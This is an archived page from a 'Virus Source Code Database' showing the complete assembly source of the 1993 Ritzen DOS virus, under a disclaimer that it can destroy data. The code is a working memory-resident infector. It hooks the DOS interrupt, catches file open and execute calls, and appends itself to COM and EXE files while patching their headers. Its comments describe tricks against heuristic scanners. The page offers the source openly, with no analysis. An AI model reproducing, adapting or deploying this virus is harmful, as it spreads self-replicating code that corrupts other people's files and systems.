<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: ritzen_asm</title>
<meta name="KEYWORDS" content="ritzen.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for ritzen.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;*****************************************************************************
;*									     *
;*    The Ritzen Virus 							     *
;*									     *
;*    (c) '93, by S.A.R. (Students Agains Ritzen) / TridenT	     	     *
;*									     *	
;*****************************************************************************

		.model tiny
		.radix 16
		.code

len		equ	offset last - atlantic
len_para	equ	len /10h

mem_size	equ	60h

		org	100h


dummy:		db	0e9h,00h,00h			; dummy file,
							; contains jump to
							; virus code.

atlantic:	call    get_ip				
		sub	bp,offset atlantic+3
		
rest_host:	push	ds
		pop	ax
		mov	cs:[segm+bp],ax
		cmp	cs:[type_host+bp],'E'		; check if host
		je	fix_exe				; is COM or EXE.

fix_com:	lea	si,cs:[com_start+bp]		; fix start of
		mov	ax,es
		inc	ax
		mov	es,ax
		mov	di,00F0h			; com host with
		mov	cx,03h				; original data.
		rep	movsb		
		
		mov	ax,es
		dec	ax
		mov	es,ax

		mov	ax,0100h			; IP start at 0100h.
		push	cs				; store segment+IP 
		push    ax				; on stack.
		jmp	chk_resident

fix_exe:	mov	ax,cs:[exe_cs+bp]		; CS and IP on stack
		mov	bx,ax
		mov	ax,ds
		add	ax,bx
		add	ax,10h
		push	ax
		mov	bx,cs:[exe_ip+bp]
		push	bx				
		
chk_resident:	mov	dx,0aaaah
		mov	ax,3000h
		int	21h
		cmp	dx,0bbbbh
		je	end_install

mem_install:	push	ds				; let DS points
		push	ds
		pop	ax				; to MCB
		dec	ax				; 2 times to fool
		dec	ax				; heuristic scanners
		push	ax
		pop	ds
		cmp	byte ptr ds:[0010],5ah		; last MCB?
		jne	abort_install			; if no, quit.
		
		mov	ax,ds:[0013]			; adjust memory
		sub	ax,mem_size			; size.
		mov	ds:[0013],ax			; store size in MCB.

		pop	ds				; restore original
							; DS segment.
		
		sub	word ptr ds:[0002],mem_size	; don't forget to
							; adjust memory
							; size stored in
							; PSP to.

vir_install:	xchg	ax,bx				; install virus
		mov	ax,es					
		add	ax,bx				; AX = virussegment
		mov	es,ax				
		mov	cs:[vir_seg+bp],ax

		push	cs
		pop	ds
		 
		lea	si,[atlantic+bp]		; copy virus to
		lea	di,es:0103h			; memory
		mov	cx,len
copy:		movsb
		dec	cx
		jnz	copy

		push	ds
		pop	es
 
hook_i21h:	cli
		mov	ax,3521h
		int	21h

		mov	ds,cs:[vir_seg+bp]
		mov	[i21h],bx
		mov	[i21h+2],es

;		mov	dx, offset ds:[mine_i21h]
;		mov	ax,2521h
;		int	21h

		mov	ax,ds
		mov	bx,ax
		mov	dx, offset ds:[mine_i21h]
		xor	ax,ax
		mov	ds,ax
		mov	ds:[4*21h],dx
		mov	ds:[4*21h+2],bx	

		sti
		
		
abort_install:	mov	ax,cs:[segm+bp]
		push	ax
		pop	es
		push	es
		pop	ds

end_install:	retf

;*************************************************************************
;*									 *
;*		I N T E R U P T   H A N D L E R 			 *
;*									 *
;*************************************************************************

mine_i24h:	mov	al,03h
		iret

mine_i21h:	pushf					; check for
		cmp	ax,3000h			; virus ID
                jne     new_21h
		cmp	dx,0aaaah
                jne     new_21h
                mov     dx,0bbbbh                       ; return ID
		popf
		iret


new_21h:	push	ax				; save registers
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	di
		push	si

chk_open:	xchg	ax,bx
		cmp	bh,3dh				; open file?
		je	chk_com

chk_exec:	cmp	bx,04b00h			; execute file?
		je	chk_com

continu:	pop	si				; restore registers
		pop	di
		pop	es
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax

next:		popf					; call original
		jmp	dword	ptr cs:[i21h]		; interupt
	
;**************************************************************************
;*									  *
;*		C H E C K  C O M / E X E   F I L E 			  *
;*									  *
;**************************************************************************	


chk_com:	mov	cs:[name_seg],ds
		mov	cs:[name_off],dx
		cld

		mov	cx,0ffh
		push	ds
		pop	es
		push	dx
		pop	di
		mov	al,'.'
		repne	scasb
		cmp	word ptr es:[di],'OC'
                jne     chk_exe
		cmp	word ptr es:[di+2],'M'
                jne	continu
                jmp     infect_com



chk_exe:	cmp	word ptr es:[di],'XE'
		jne	continu
		cmp	word ptr es:[di+2],'E'
		jne 	continu
		jmp	infect_exe



;**************************************************************************
;*									  *
;*		I N F E C T   C O M - F I L E				  *
;*									  *
;**************************************************************************

infect_com:	call	init
		cmp	cs:[fout],0ffh
		je	close_file
		
		mov	cs:[type_host],'C'
		
		mov	ax,4200h	; go to start of file	
		call	mov_point
		
		mov	cx,03h
		mov	ah,3fh
		lea	dx,cs:[com_start]
		call	do_int21h
		
		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point

		sub	ax,03h
		mov	cs:[lenght_file],ax

		call	write_jmp
		call	write_vir

		call	save_date

close_file:	mov	bx,cs:[handle]
		mov	ah,3eh
		call	do_int21h
		
restore_int24h:	mov	dx,cs:[i24h]
		mov	ds,cs:[i24h+2]
		mov	ax,2524h
		call	do_int21h

		jmp	continu

;**************************************************************************
;*									  *
;*		I N F E C T   E X E - F I L E				  *
;*									  *
;************************************************************************** 	

infect_exe:	call	init
		cmp	cs:[fout],0ffh
		je	close_file
		mov	cs:[type_host],'E'

		mov	ax,4200h
		call	mov_point
		mov	ah,3fh
		mov	cx,18h
		lea	dx,[head_exe]
		call	do_int21h

		call	inf_exe

		call	save_date
		jmp	close_file		


;**************************************************************************
;*									  *
;*		R O U T I N E S						  *
;*									  *
;**************************************************************************

get_ip:		push	sp				; get ip from stack
		pop	bx	
		mov	ax, word ptr cs:[bx]
		mov	bp,ax
		ret
	
init:		mov	cs:[fout],00h
		
		call	int24h
		call	open_file
		jc	error
		call	set_atributes
                call    get_date
		call	chk_infect
		je	error
		ret

error:		mov	cs:[fout],0ffh
		ret


int24h:		push	cs
		pop	ds
		mov	ax,3524h
		call	do_int21h
		mov	cs:[i24h],bx
		mov	cs:[i24h+2],es
		mov	dx, offset mine_i24h
		mov	ax,2524h
		call	do_int21h
		ret

mov_point:	push	cs
		pop	ds
		mov	bx,cs:[handle]
		xor	cx,cx
		xor	dx,dx
		call	do_int21h	
		ret

open_file:	mov	ds,cs:[name_seg]
		mov	dx,cs:[name_off]
		mov	ax,3d02h
		call	do_int21h

		mov	cs:[handle],ax
		mov	bx,ax
		ret

set_atributes:	mov	ax,4200h
		mov	ds,cs:[name_seg]
		mov	dx,cs:[name_off]
		call	do_int21h
		and	cl,0feh
		mov	ax,4301h
		call	do_int21h
		ret

get_date:	mov	bx,cs:[handle]
		mov	ax,5700h
		call	do_int21h
		mov	cs:[date],dx
		mov	cs:[time],cx
		ret

chk_infect:	push	cs
		pop	ds
		mov	ax,4202h
		xor	cx,cx
		sub	cx,01h
		xor	dx,dx
		sub	dx,02h
		mov	bx,cs:[handle]
		call	do_int21h
		
		mov	ah,3fh
		mov	cx,02h
		lea	dx,cs:[file_id]
		call	do_int21h

		mov	al, byte ptr cs:[file_id]
		mov	ah, byte ptr cs:[file_id]+1
		cmp	ax,[virus_id]
		ret

write_jmp:	push	cs
		pop	ds
		mov	ax,4200h
		call	mov_point
		mov	ah,40h
		mov	cx,01h
		lea	dx,cs:[jump]
		call	do_int21h
		
		mov	ah,40h
		mov	cx,02h
		lea	dx,cs:[lenght_file]
		call	do_int21h
		ret
	
write_vir:	push	cs
		pop	ds
		mov	ax,4202h
		call	mov_point
		mov	ah,40h
		mov	cx,len
		mov	dx,103h
		call	do_int21h
		ret	

save_date:	mov	ax,5700h
		call	do_int21h
		mov	cs:[date],dx
		mov	cs:[time],cx
		ret
		
inf_exe:	mov	ax,word ptr cs:[head_exe+14h]
		mov	cs:[exe_ip],ax
		mov	ax, word ptr cs:[head_exe+16h]
		mov	cs:[exe_cs],ax

		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point
		mov	bx,10h
		div	bx
		sub	ax, word ptr cs:[head_exe+08h]
		mov	cs:[new_cs],ax
		mov	cs:[new_ip],dx

		call	write_vir

		mov	ax,4200h
		call	mov_point
		mov	ax,4202h
		call	mov_point
		mov	bx,0200h
		div	bx
		cmp	dx,0000h
		jne	not_zero
		jmp	zero
not_zero:	inc	ax
zero:		mov	word ptr cs:[head_exe+02h],dx
		mov	word ptr cs:[head_exe+04h],ax
		mov	ax,cs:[new_ip]
		mov	word ptr cs:[head_exe+14h],ax
		mov	ax,cs:[new_cs]
		mov	word ptr cs:[head_exe+16h],ax
		mov	word ptr cs:[head_exe+0Eh],ax
		add	word ptr cs:[head_exe+10],len_para
		
;		mov	word ptr cs:[head_exe+10],1000

		mov	ax,4200h
		call	mov_point

		mov	ah,40h
		mov	bx,cs:[handle]
		mov	cx,18h
		lea	dx,cs:[head_exe]

		call	do_int21h
		ret
		
do_int21h:	pushf
		call	dword ptr cs:[i21h]
		ret

;****************************************************************************
;*									    *
;*		D A T A							    *
;*									    *
;****************************************************************************

type_host	db	'C'
com_start	db	0cdh,20h,90h
message		db	" Dedicated to Ritzen, our Minister of Education and Science."
		db      " We are getting sick of your budget cuts so we hope that"
		db      " you get sick of this virus.."
		db	" (c) '93 by S.A.R. / TridenT ."
exe_cs		dw	?
exe_ip		dw	?
new_cs		dw	?
new_ip		dw	?
vir_seg		dw	?
i21h		dw	00h,00h
i24h		dw	00h,00h
name_seg	dw	?
name_off	dw	?
lenght_file	dw	?
head_exe	db	18 dup (?)
handle		dw	?
fout		db	?
file_id		dw	?
jump		db	0e9h
date		dw	?	
time		dw	?
segm		dw	?
virus_id	dw	"AP"
last		dw	"AP"

		end	dummy 	

</textarea></td></tr></table></body></html>
